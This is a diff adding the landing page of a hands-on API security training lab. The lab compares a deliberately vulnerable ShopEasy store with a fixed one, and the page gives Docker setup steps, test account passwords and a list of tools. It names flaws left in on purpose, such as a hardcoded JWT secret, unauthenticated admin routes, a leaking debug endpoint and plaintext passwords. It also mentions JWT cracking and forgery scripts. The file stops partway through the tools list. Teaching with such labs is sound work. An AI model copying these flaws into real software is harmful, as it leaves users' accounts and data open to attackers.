@@ -1,0 +1,1390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API Security Lab — ShopEasy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,700;0,9..144,900;1,9..144,400&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#0d0f14; --surface:#13161d; --surface2:#1a1e28;
+  --border:rgba(255,255,255,0.06); --border2:rgba(255,255,255,0.11);
+  --text:#e2e4ec; --muted:#6b7280;
+  --green:#00e5a0; --green-dim:rgba(0,229,160,0.08); --green-b:rgba(0,229,160,0.18);
+  --amber:#f59e0b; --amber-dim:rgba(245,158,11,0.08);
+  --red:#f43f5e; --red-dim:rgba(244,63,94,0.08);
+  --blue:#3b82f6; --blue-dim:rgba(59,130,246,0.08);
+  --purple:#a855f7; --purple-dim:rgba(168,85,247,0.1);
+  --mono:'JetBrains Mono',monospace;
+  --display:'Fraunces',serif;
+  --body:'DM Sans',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+
+/* ── NAV ── */
+nav{position:fixed;top:0;left:0;right:0;z-index:200;height:56px;
+  background:rgba(13,15,20,0.92);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;padding:0 2rem}
+.nav-logo{font-family:var(--mono);font-size:0.82rem;color:var(--green);
+  display:flex;align-items:center;gap:8px}
+.nav-logo::before{content:'';width:7px;height:7px;border-radius:50%;
+  background:var(--green);animation:blink 2s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.25}}
+.nav-links{display:flex;gap:2px}
+.nav-link{font-size:0.78rem;color:var(--muted);padding:0.3rem 0.75rem;
+  border-radius:6px;transition:all 0.15s;font-family:var(--mono)}
+.nav-link:hover{color:var(--text);background:var(--surface2)}
+.nav-link.active{color:var(--green)}
+.nav-cta{font-family:var(--mono);font-size:0.75rem;background:var(--green);
+  color:#000;padding:0.38rem 0.9rem;border-radius:6px;font-weight:700;transition:opacity 0.15s}
+.nav-cta:hover{opacity:0.85}
+@media(max-width:700px){.nav-links{display:none}}
+
+/* ── HERO ── */
+.hero{min-height:100vh;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:6rem 2rem 4rem;text-align:center;position:relative;overflow:hidden}
+.hero-dots{position:absolute;inset:0;
+  background-image:radial-gradient(rgba(0,229,160,0.07) 1px,transparent 1px);
+  background-size:32px 32px;pointer-events:none}
+.hero-glow{position:absolute;top:25%;left:50%;transform:translateX(-50%);
+  width:800px;height:500px;
+  background:radial-gradient(ellipse,rgba(0,229,160,0.04) 0%,transparent 65%);
+  pointer-events:none}
+.hero-badge{font-family:var(--mono);font-size:0.7rem;color:var(--green);
+  background:var(--green-dim);border:1px solid var(--green-b);
+  padding:0.3rem 1rem;border-radius:100px;margin-bottom:2rem;
+  display:inline-flex;align-items:center;gap:8px;letter-spacing:0.04em}
+.hero-badge-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 2s infinite}
+h1{font-family:var(--display);font-size:clamp(2.6rem,6vw,5.2rem);
+  font-weight:900;line-height:1.05;letter-spacing:-0.02em;margin-bottom:1.5rem;max-width:860px}
+h1 em{font-style:italic;color:var(--green)}
+.hero-sub{color:var(--muted);font-size:1rem;max-width:540px;margin:0 auto 3rem;line-height:1.8}
+.hero-ctas{display:flex;gap:0.75rem;justify-content:center;flex-wrap:wrap}
+.btn-primary{background:var(--green);color:#000;font-family:var(--mono);font-size:0.82rem;font-weight:700;
+  padding:0.75rem 1.75rem;border-radius:8px;transition:all 0.15s;display:inline-flex;align-items:center;gap:8px}
+.btn-primary:hover{opacity:0.88;transform:translateY(-1px)}
+.btn-ghost{background:transparent;color:var(--text);font-family:var(--mono);font-size:0.82rem;
+  padding:0.75rem 1.75rem;border-radius:8px;border:1px solid var(--border2);transition:all 0.15s;
+  display:inline-flex;align-items:center;gap:8px}
+.btn-ghost:hover{border-color:var(--green);color:var(--green)}
+.hero-stats{display:flex;gap:3.5rem;margin-top:5rem;padding-top:3rem;border-top:1px solid var(--border)}
+.stat-n{font-family:var(--display);font-size:2.2rem;font-weight:900}
+.stat-l{font-size:0.72rem;color:var(--muted);font-family:var(--mono);margin-top:2px}
+@media(max-width:500px){.hero-stats{gap:2rem}}
+
+/* ── APP SPLIT CARDS ── */
+.app-split{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;margin-bottom:3rem}
+@media(max-width:700px){.app-split{grid-template-columns:1fr}}
+.app-card{border-radius:14px;padding:1.75rem;border:1px solid}
+.app-card.vuln-app{background:rgba(244,63,94,0.04);border-color:rgba(244,63,94,0.18)}
+.app-card.secure-app{background:rgba(0,229,160,0.04);border-color:rgba(0,229,160,0.18)}
+.app-card-header{display:flex;align-items:center;gap:0.75rem;margin-bottom:1rem}
+.app-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.app-dot.red{background:var(--red)}
+.app-dot.green{background:var(--green)}
+.app-card-title{font-family:var(--display);font-weight:800;font-size:1.1rem}
+.app-port{font-family:var(--mono);font-size:0.72rem;padding:0.2rem 0.6rem;border-radius:5px;border:1px solid}
+.app-port.red{background:var(--red-dim);color:var(--red);border-color:rgba(244,63,94,0.2)}
+.app-port.green{background:var(--green-dim);color:var(--green);border-color:var(--green-b)}
+.app-card p{font-size:0.85rem;color:var(--muted);line-height:1.7;margin-bottom:1rem}
+.app-feature-list{list-style:none;display:flex;flex-direction:column;gap:0.4rem}
+.app-feature-list li{font-size:0.8rem;font-family:var(--mono);display:flex;align-items:center;gap:0.5rem}
+
+/* ── SECTION ── */
+.section{padding:5rem 2rem;max-width:1080px;margin:0 auto}
+.sec-label{font-family:var(--mono);font-size:0.68rem;color:var(--green);
+  text-transform:uppercase;letter-spacing:0.12em;margin-bottom:0.6rem}
+h2{font-family:var(--display);font-size:clamp(1.7rem,3vw,2.4rem);
+  font-weight:900;letter-spacing:-0.02em;margin-bottom:0.75rem}
+h2 em{font-style:italic;color:var(--green)}
+.sec-sub{color:var(--muted);font-size:0.9rem;max-width:500px;margin-bottom:2.5rem;line-height:1.75}
+hr.div{border:none;border-top:1px solid var(--border);max-width:1080px;margin:0 auto}
+
+/* ── WARN BANNER ── */
+.warn-banner{background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.18);
+  border-radius:10px;padding:1rem 1.25rem;display:flex;gap:0.75rem;
+  align-items:flex-start;margin-bottom:2.5rem;font-size:0.85rem;color:#fcd34d}
+
+/* ── SETUP GRID ── */
+.setup-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1rem;margin-bottom:2.5rem}
+.setup-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.4rem;transition:border-color 0.2s}
+.setup-card:hover{border-color:var(--border2)}
+.step-pill{font-family:var(--mono);font-size:0.65rem;color:var(--green);
+  background:var(--green-dim);border:1px solid var(--green-b);
+  padding:0.18rem 0.55rem;border-radius:4px;display:inline-block;margin-bottom:0.9rem}
+.setup-card h3{font-size:0.92rem;font-weight:600;margin-bottom:0.35rem}
+.setup-card p{font-size:0.8rem;color:var(--muted);margin-bottom:0.9rem}
+
+/* ── CODE BLOCKS ── */
+.cmd{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:0.75rem}
+.cmd-bar{background:var(--surface2);border-bottom:1px solid var(--border);
+  padding:0.4rem 1rem;font-family:var(--mono);font-size:0.65rem;
+  color:var(--muted);display:flex;align-items:center;justify-content:space-between}
+.cmd-bar span{color:var(--green)}
+.cmd-body{padding:0.9rem 1rem;font-family:var(--mono);font-size:0.78rem;
+  color:var(--green);overflow-x:auto;white-space:pre;line-height:1.6}
+.out{background:#090b0e;border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:0.75rem}
+.out-bar{background:var(--surface);border-bottom:1px solid var(--border);
+  padding:0.4rem 1rem;font-family:var(--mono);font-size:0.65rem;color:var(--muted)}
+.out-body{padding:0.9rem 1rem;font-family:var(--mono);font-size:0.76rem;
+  color:#94a3b8;overflow-x:auto;white-space:pre;line-height:1.7}
+.out-body .ok{color:var(--green)}
+.out-body .warn{color:var(--amber)}
+.out-body .bad{color:var(--red)}
+.copy-btn{background:var(--surface);border:1px solid var(--border);border-radius:4px;
+  color:var(--muted);font-family:var(--mono);font-size:0.62rem;
+  padding:0.18rem 0.5rem;cursor:pointer;transition:color 0.15s}
+.copy-btn:hover{color:var(--text)}
+code.inline{font-family:var(--mono);font-size:0.78rem;background:var(--surface2);
+  padding:0.1rem 0.45rem;border-radius:4px;color:var(--text)}
+
+/* ── TOOLS ── */
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;margin-bottom:2.5rem}
+.tool-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.25rem}
+.tool-name{font-family:var(--mono);font-size:0.88rem;color:var(--green);
+  margin-bottom:0.4rem;display:flex;align-items:center;gap:8px}
+.tool-ver{font-size:0.65rem;color:var(--muted);background:var(--surface2);
+  padding:0.1rem 0.4rem;border-radius:4px;border:1px solid var(--border)}
+.tool-desc{font-size:0.8rem;color:var(--muted);margin-bottom:0.75rem;line-height:1.6}
+.tool-install{font-family:var(--mono);font-size:0.72rem;color:var(--amber);
+  background:var(--amber-dim);padding:0.3rem 0.6rem;border-radius:5px;
+  border:1px solid rgba(245,158,11,0.15);display:inline-block}
+
+/* ── ACCOUNTS TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.84rem}
+.tbl thead th{text-align:left;font-family:var(--mono);font-size:0.65rem;
+  color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;
+  padding:0 1rem 0.75rem;border-bottom:1px solid var(--border)}
+.tbl tbody td{padding:0.8rem 1rem;border-bottom:1px solid var(--border);vertical-align:middle}
+.tbl tbody tr:last-child td{border:none}
+.tbl tbody tr:hover td{background:var(--surface2)}
+.mono{font-family:var(--mono);font-size:0.78rem}
+.badge{font-family:var(--mono);font-size:0.65rem;padding:0.18rem 0.55rem;border-radius:4px}
+.badge-admin{background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)}
+.badge-user{background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)}
+
+/* ── MODE SWITCHER ── */
+.mode-switcher{display:flex;gap:8px;margin-bottom:2.5rem;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:12px;padding:6px;width:fit-content}
+.mode-btn{font-family:var(--mono);font-size:0.78rem;padding:0.5rem 1.5rem;
+  border-radius:8px;border:none;cursor:pointer;transition:all 0.2s;
+  display:flex;align-items:center;gap:6px;color:var(--muted);background:transparent}
+.mode-btn.active-vuln{background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.25)}
+.mode-btn.active-secure{background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)}
+.mode-btn:not(.active-vuln):not(.active-secure):hover{background:var(--surface2);color:var(--text)}
+
+/* ── LAB CONTEXT BADGE ── */
+.lab-context{display:flex;align-items:center;gap:0.75rem;
+  padding:0.75rem 1.25rem;border-radius:10px;margin-bottom:2rem;font-size:0.85rem}
+.lab-context.vuln-ctx{background:var(--red-dim);border:1px solid rgba(244,63,94,0.2);color:#fda4af}
+.lab-context.secure-ctx{background:var(--green-dim);border:1px solid var(--green-b);color:#6ee7b7}
+
+/* ── ATTACK OVERVIEW ── */
+.attacks-overview{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1rem;margin-bottom:2.5rem}
+.atk-card{background:var(--surface);border:1px solid var(--border);
+  border-radius:12px;padding:1.4rem;transition:all 0.2s;cursor:pointer}
+.atk-card:hover{border-color:var(--border2);transform:translateY(-2px)}
+.atk-icon{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;
+  justify-content:center;font-size:1rem;margin-bottom:0.9rem}
+.atk-title{font-weight:600;font-size:0.92rem;margin-bottom:0.35rem}
+.atk-desc{font-size:0.78rem;color:var(--muted);line-height:1.6;margin-bottom:0.75rem}
+.atk-owasp{font-family:var(--mono);font-size:0.65rem;padding:0.18rem 0.55rem;border-radius:4px;display:inline-block}
+
+/* ── COLLAPSIBLE LAB PANELS ── */
+.lab-panel{border:1px solid var(--border);border-radius:14px;margin-bottom:1rem;overflow:hidden;transition:border-color 0.2s}
+.lab-panel.open{border-color:var(--border2)}
+.lab-trigger{width:100%;background:var(--surface);border:none;
+  padding:1.4rem 1.75rem;display:flex;align-items:center;gap:1.25rem;
+  cursor:pointer;text-align:left;transition:background 0.15s;color:var(--text)}
+.lab-trigger:hover{background:var(--surface2)}
+.lab-trigger-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0}
+.lab-trigger-info{flex:1}
+.lab-trigger-title{font-family:var(--display);font-size:1.05rem;font-weight:700;margin-bottom:0.2rem}
+.lab-trigger-sub{font-size:0.8rem;color:var(--muted)}
+.lab-trigger-right{display:flex;align-items:center;gap:0.75rem;flex-shrink:0}
+.lab-owasp{font-family:var(--mono);font-size:0.65rem;padding:0.18rem 0.6rem;border-radius:4px;white-space:nowrap}
+.lab-chevron{width:20px;height:20px;color:var(--muted);transition:transform 0.25s;flex-shrink:0}
+.lab-panel.open .lab-chevron{transform:rotate(180deg)}
+.lab-body{display:none;padding:0 1.75rem 1.75rem;border-top:1px solid var(--border);background:var(--bg)}
+.lab-panel.open .lab-body{display:block}
+.lab-concept{background:var(--surface);border-radius:10px;padding:1.1rem 1.25rem;
+  margin:1.5rem 0;font-size:0.875rem;color:var(--muted);line-height:1.75;border-left:3px solid var(--border2)}
+
+/* ── STEPS ── */
+.step{margin:1.5rem 0}
+.step-hd{display:flex;align-items:center;gap:0.75rem;margin-bottom:0.6rem}
+.step-num{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;
+  justify-content:center;font-family:var(--mono);font-size:0.7rem;font-weight:700;flex-shrink:0}
+.step h3{font-size:0.95rem;font-weight:600}
+.step p{font-size:0.858rem;color:var(--muted);margin-bottom:0.6rem;line-height:1.75}
+
+/* ── CALLOUTS ── */
+.callout{border-radius:10px;padding:0.9rem 1.1rem;margin:0.75rem 0;
+  font-size:0.84rem;border-left:3px solid;display:flex;gap:0.65rem;align-items:flex-start}
+.callout.info{background:var(--blue-dim);border-color:var(--blue);color:#93c5fd}
+.callout.warn{background:var(--amber-dim);border-color:var(--amber);color:#fcd34d}
+.callout.danger{background:var(--red-dim);border-color:var(--red);color:#fda4af}
+.callout.success{background:var(--green-dim);border-color:var(--green);color:#6ee7b7}
+.callout-icon{flex-shrink:0;margin-top:1px}
+
+/* ── COMPARE (vuln vs fix) ── */
+.compare{display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin:1.25rem 0}
+@media(max-width:640px){.compare{grid-template-columns:1fr}}
+.cmp-box{border-radius:10px;overflow:hidden}
+.cmp-hd{padding:0.45rem 1rem;font-family:var(--mono);font-size:0.7rem;font-weight:700}
+.cmp-body{padding:0.9rem 1rem;font-family:var(--mono);font-size:0.76rem;line-height:1.7;white-space:pre-wrap}
+.vuln .cmp-hd{background:rgba(244,63,94,0.15);color:var(--red)}
+.vuln .cmp-body{background:rgba(244,63,94,0.04);color:#fca5a5;border:1px solid rgba(244,63,94,0.12);border-top:none}
+.fix .cmp-hd{background:rgba(0,229,160,0.1);color:var(--green)}
+.fix .cmp-body{background:rgba(0,229,160,0.03);color:#6ee7b7;border:1px solid rgba(0,229,160,0.1);border-top:none}
+
+/* ── SECURE RESPONSE BLOCK ── */
+.secure-result{background:rgba(0,229,160,0.04);border:1px solid rgba(0,229,160,0.15);
+  border-radius:10px;padding:1.1rem 1.25rem;margin:1rem 0;font-size:0.84rem}
+.secure-result-title{font-family:var(--mono);font-size:0.7rem;color:var(--green);
+  font-weight:700;margin-bottom:0.6rem;display:flex;align-items:center;gap:6px}
+.secure-result p{color:#6ee7b7;line-height:1.7}
+.secure-result code{font-family:var(--mono);font-size:0.8rem;background:rgba(0,229,160,0.1);
+  padding:0.1rem 0.4rem;border-radius:4px}
+
+/* ── ATTACK CHAIN ── */
+.chain{background:var(--surface);border:1px solid var(--border);border-radius:10px;
+  padding:1.1rem 1.25rem;margin:1.25rem 0;font-family:var(--mono);font-size:0.76rem}
+.chain-label{font-size:0.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:0.6rem}
+.chain-row{display:flex;align-items:center;gap:0.6rem;padding:0.4rem 0;border-bottom:1px dashed var(--border)}
+.chain-row:last-child{border:none}
+.chain-step{color:var(--green);min-width:72px}
+.chain-desc{color:var(--muted);flex:1}
+.chain-res{color:var(--amber);font-size:0.7rem;white-space:nowrap}
+
+/* ── SUMMARY TABLE ── */
+.summary-tbl{width:100%;border-collapse:collapse;font-size:0.84rem}
+.summary-tbl thead th{text-align:left;font-family:var(--mono);font-size:0.65rem;
+  color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;
+  padding:0 1rem 0.75rem;border-bottom:1px solid var(--border)}
+.summary-tbl tbody td{padding:0.9rem 1rem;border-bottom:1px solid var(--border);vertical-align:top}
+.summary-tbl tbody tr:last-child td{border:none}
+.summary-tbl tbody tr:hover td{background:var(--surface2)}
+.sev{font-family:var(--mono);font-size:0.65rem;padding:0.18rem 0.55rem;border-radius:4px}
+.sev-h{background:var(--red-dim);color:var(--red);border:1px solid rgba(244,63,94,0.2)}
+
+/* ── FOOTER ── */
+footer{border-top:1px solid var(--border);padding:2.5rem 2rem}
+.footer-inner{max-width:1080px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+.footer-logo{font-family:var(--mono);font-size:0.82rem;color:var(--green)}
+.footer-links{display:flex;gap:1.5rem}
+.footer-links a{font-size:0.78rem;color:var(--muted);transition:color 0.15s}
+.footer-links a:hover{color:var(--text)}
+.footer-note{font-size:0.72rem;color:var(--muted)}
+
+/* ── OS TABS ── */
+.os-tab{background:var(--surface);border:1px solid var(--border);border-radius:7px;
+  padding:0.4rem 1rem;font-family:var(--mono);font-size:0.75rem;color:var(--muted);
+  cursor:pointer;transition:all 0.15s}
+.os-tab:hover{color:var(--text);border-color:var(--border2)}
+.os-tab.active{background:var(--green-dim);color:var(--green);border-color:var(--green-b)}
+
+/* ── SECTION HEADING WITH PORT BADGE ── */
+.section-with-badge{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;margin-bottom:0.75rem}
+.port-badge{font-family:var(--mono);font-size:0.75rem;padding:0.3rem 0.85rem;
+  border-radius:6px;font-weight:700;border:1px solid}
+.port-badge.vuln{background:var(--red-dim);color:var(--red);border-color:rgba(244,63,94,0.25)}
+.port-badge.secure{background:var(--green-dim);color:var(--green);border-color:var(--green-b)}
+</style>
+</head>
+<body>
+
+<!-- ── NAV ── -->
+<nav>
+  <div class="nav-logo">ShopEasy · API Security Lab</div>
+  <div class="nav-links">
+    <a href="#setup" class="nav-link">Setup</a>
+    <a href="#tools" class="nav-link">Tools</a>
+    <a href="#labs-vuln" class="nav-link">Vulnerable</a>
+    <a href="#labs-secure" class="nav-link">Secure</a>
+    <a href="#summary" class="nav-link">Summary</a>
+  </div>
+  <a class="nav-cta" href="https://github.com/YOUR_USERNAME/api-security-lab" target="_blank">GitHub ↗</a>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="hero">
+  <div class="hero-dots"></div>
+  <div class="hero-glow"></div>
+  <div class="hero-badge"><span class="hero-badge-dot"></span>Free · Hands-on · Beginner friendly</div>
+  <h1>Break a real app.<br><em>Learn API Security.</em></h1>
+  <p class="hero-sub">Two versions of the same e-commerce store — one vulnerable, one fixed. Attack both and see exactly what secure code does differently.</p>
+  <div class="hero-ctas">
+    <a class="btn-primary" href="#setup">
+      <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path d="M5 3l14 9-14 9V3z"/></svg>
+      Start the Lab
+    </a>
+    <a class="btn-ghost" href="https://github.com/YOUR_USERNAME/api-security-lab" target="_blank">View on GitHub</a>
+  </div>
+  <div class="hero-stats">
+    <div><div class="stat-n">2</div><div class="stat-l">app versions</div></div>
+    <div><div class="stat-n">4</div><div class="stat-l">attacks</div></div>
+    <div><div class="stat-n">8</div><div class="stat-l">fixes explained</div></div>
+    <div><div class="stat-n">free</div><div class="stat-l">forever</div></div>
+  </div>
+</div>
+
+<!-- ── TWO APPS EXPLAINED ── -->
+<section class="section" id="apps">
+  <div class="sec-label">// two apps, one lesson</div>
+  <h2>Vulnerable <em>vs</em> Secure</h2>
+  <p class="sec-sub">Both apps are identical ShopEasy stores with the same data, pages and features. The only difference is the code underneath.</p>
+
+  <div class="app-split">
+    <div class="app-card vuln-app">
+      <div class="app-card-header">
+        <span class="app-dot red"></span>
+        <span class="app-card-title">ShopEasy — Vulnerable</span>
+        <span class="app-port red">:5000</span>
+      </div>
+      <p>Intentionally broken API. Every vulnerability from the OWASP API Top 10 that we cover is present and exploitable. This is where you practice your attacks.</p>
+      <ul class="app-feature-list">
+        <li><span style="color:var(--red)">✗</span> Hardcoded JWT secret (<code class="inline">secret123</code>)</li>
+        <li><span style="color:var(--red)">✗</span> Role trusted from JWT payload</li>
+        <li><span style="color:var(--red)">✗</span> No ownership checks on orders</li>
+        <li><span style="color:var(--red)">✗</span> Messages BOLA via query param</li>
+        <li><span style="color:var(--red)">✗</span> Debug endpoint leaks secrets</li>
+        <li><span style="color:var(--red)">✗</span> Admin routes need no auth</li>
+        <li><span style="color:var(--red)">✗</span> Passwords stored in plaintext</li>
+      </ul>
+    </div>
+    <div class="app-card secure-app">
+      <div class="app-card-header">
+        <span class="app-dot green"></span>
+        <span class="app-card-title">ShopEasy — Secure</span>
+        <span class="app-port green">:5001</span>
+      </div>
+      <p>Every vulnerability fixed. Run the same attacks against this version and observe the difference — 403s, 401s, and silence where the vulnerable app gave full access.</p>
+      <ul class="app-feature-list">
+        <li><span style="color:var(--green)">✓</span> Random 256-bit JWT secret at startup</li>
+        <li><span style="color:var(--green)">✓</span> Role always fetched from database</li>
+        <li><span style="color:var(--green)">✓</span> Ownership verified on every order</li>
+        <li><span style="color:var(--green)">✓</span> user_id from token only, never params</li>
+        <li><span style="color:var(--green)">✓</span> Debug endpoint does not exist</li>
+        <li><span style="color:var(--green)">✓</span> Admin routes require auth + DB role check</li>
+        <li><span style="color:var(--green)">✓</span> Passwords hashed, never returned</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- ── SETUP ── -->
+<section class="section" id="setup">
+  <div class="sec-label">// getting started</div>
+  <h2>Lab <em>setup</em></h2>
+  <p class="sec-sub">Both apps run locally in Docker simultaneously. No accounts, no cloud, no fees.</p>
+
+  <div class="warn-banner">
+    <span style="flex-shrink:0;margin-top:1px">⚠</span>
+    <span>ShopEasy Vulnerable is <strong>intentionally broken software</strong>. Run it only on your local machine. Never expose it on a public network or deploy it to a server.</span>
+  </div>
+
+  <h3 style="font-size:0.95rem;font-weight:600;margin-bottom:1rem">Step 1 — Install Docker</h3>
+  <p style="font-size:0.85rem;color:var(--muted);margin-bottom:1rem">Docker runs both apps in isolated containers. Install for your operating system.</p>
+
+  <div style="display:flex;gap:6px;margin-bottom:1rem">
+    <button class="os-tab active" onclick="showOS('linux')">Kali / Ubuntu</button>
+    <button class="os-tab" onclick="showOS('mac')">macOS</button>
+    <button class="os-tab" onclick="showOS('win')">Windows</button>
+  </div>
+
+  <div id="os-linux">
+    <div class="cmd">
+      <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('os-linux-cmd',this)">copy</button></div>
+      <div class="cmd-body" id="os-linux-cmd">sudo apt update
+sudo apt install -y docker.io docker-compose
+sudo systemctl start docker
+sudo systemctl enable docker
+# Allow docker without sudo (log out and back in after)
+sudo usermod -aG docker $USER</div>
+    </div>
+    <p style="font-size:0.8rem;color:var(--muted)">Verify: <code class="inline">docker --version</code></p>
+  </div>
+
+  <div id="os-mac" style="display:none">
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <span>Download <strong>Docker Desktop for Mac</strong> from <a href="https://www.docker.com/products/docker-desktop/" target="_blank" style="color:var(--blue)">docker.com/products/docker-desktop</a> · Install the .dmg · Open Docker Desktop and wait for the whale icon to stop animating.</span>
+    </div>
+  </div>
+
+  <div id="os-win" style="display:none">
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <span>Download <strong>Docker Desktop for Windows</strong> from <a href="https://www.docker.com/products/docker-desktop/" target="_blank" style="color:var(--blue)">docker.com/products/docker-desktop</a> · Install and restart · Open Docker Desktop from the Start menu and wait for the whale icon to stop animating.</span>
+    </div>
+    <div class="callout warn" style="margin-top:0.5rem">
+      <span class="callout-icon">⚠</span>
+      <span>Docker Desktop must be <strong>running</strong> before any docker commands. If you see <code class="inline">pipe/dockerDesktopLinuxEngine not found</code> — Docker Desktop isn't started yet.</span>
+    </div>
+  </div>
+
+  <div style="height:1.5rem"></div>
+
+  <h3 style="font-size:0.95rem;font-weight:600;margin-bottom:1rem">Step 2 — Clone and start both apps</h3>
+  <div class="setup-grid">
+    <div class="setup-card">
+      <span class="step-pill">clone</span>
+      <h3>Get the files</h3>
+      <p>Pull the repo to your machine.</p>
+      <div class="cmd">
+        <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('c-clone',this)">copy</button></div>
+        <div class="cmd-body" id="c-clone">git clone https://github.com/YOUR_USERNAME/api-security-lab.git
+cd api-security-lab</div>
+      </div>
+    </div>
+    <div class="setup-card">
+      <span class="step-pill">start both</span>
+      <h3>Launch both apps</h3>
+      <p>One command starts both simultaneously.</p>
+      <div class="cmd">
+        <div class="cmd-bar"><span>terminal — from shopeasy-combined/</span><button class="copy-btn" onclick="cpEl('c-start',this)">copy</button></div>
+        <div class="cmd-body" id="c-start">cd shopeasy-combined
+docker compose up --build -d</div>
+      </div>
+    </div>
+    <div class="setup-card">
+      <span class="step-pill">verify</span>
+      <h3>Open both stores</h3>
+      <p>Open in two browser tabs side by side.</p>
+      <div class="cmd">
+        <div class="cmd-bar"><span>browser</span><button class="copy-btn" onclick="cpEl('c-open',this)">copy</button></div>
+        <div class="cmd-body" id="c-open">http://localhost:5000  ← Vulnerable (red brand)
+http://localhost:5001  ← Secure   (green brand)</div>
+      </div>
+    </div>
+    <div class="setup-card">
+      <span class="step-pill">stop</span>
+      <h3>Shut down when done</h3>
+      <p>Stops both containers cleanly.</p>
+      <div class="cmd">
+        <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('c-stop',this)">copy</button></div>
+        <div class="cmd-body" id="c-stop">docker compose down</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <span class="callout-icon">ℹ</span>
+    <span>Want to run only one app at a time? Each has its own folder: <code class="inline">cd shopeasy-vulnerable && docker compose up --build -d</code> starts only the vulnerable app on port 5000. Same for <code class="inline">shopeasy-secure</code> on port 5001.</span>
+  </div>
+
+  <h3 style="font-size:0.95rem;font-weight:600;margin:2.5rem 0 1rem">Test accounts</h3>
+  <p style="font-size:0.85rem;color:var(--muted);margin-bottom:1rem">Same accounts exist on both apps.</p>
+  <div style="border:1px solid var(--border);border-radius:12px;overflow:hidden">
+    <table class="tbl">
+      <thead><tr><th>Username</th><th>Password</th><th>Role</th><th>User ID</th><th>Used for</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">alice</td><td class="mono">alice123</td><td><span class="badge badge-user">user</span></td><td class="mono">1</td><td style="font-size:0.78rem;color:var(--muted)">Primary attacker account</td></tr>
+        <tr><td class="mono">bob</td><td class="mono">bob456</td><td><span class="badge badge-user">user</span></td><td class="mono">2</td><td style="font-size:0.78rem;color:var(--muted)">BOLA victim</td></tr>
+        <tr><td class="mono">charlie</td><td class="mono">charlie789</td><td><span class="badge badge-user">user</span></td><td class="mono">3</td><td style="font-size:0.78rem;color:var(--muted)">BOLA victim</td></tr>
+        <tr><td class="mono">admin</td><td class="mono">adminpass</td><td><span class="badge badge-admin">admin</span></td><td class="mono">4</td><td style="font-size:0.78rem;color:var(--muted)">Target of JWT + Message attacks</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- ── TOOLS ── -->
+<section class="section" id="tools">
+  <div class="sec-label">// tools</div>
+  <h2>What you'll <em>use</em></h2>
+  <p class="sec-sub">All five tools are free and open-source. Kali Linux users have most of them already.</p>
+
+  <div class="tools-grid">
+    <div class="tool-card">
+      <div class="tool-name">curl <span class="tool-ver">pre-installed</span></div>
+      <div class="tool-desc">Command-line HTTP client. Makes API requests — GET, POST, with headers and JSON bodies. The primary tool for all four attacks.</div>
+      <div class="tool-install">sudo apt install curl</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">ffuf <span class="tool-ver">pre-installed on Kali</span></div>
+      <div class="tool-desc">Fuzz Faster U Fool. Discovers hidden API endpoints by trying thousands of path names from a wordlist at high speed.</div>
+      <div class="tool-install">sudo apt install ffuf</div>
+    </div>
+    <div class="tool-card">
+      <div class="tool-name">Python 3 <span class="tool-ver">pre-installed</span></div>
+      <div class="tool-desc">Used for parsing JSON output from curl, and for writing the JWT cracking and forgery scripts.</div>
+      <div class="tool-install">sudo apt install python3</div>
+    </div>
+    <div class="tool-card">
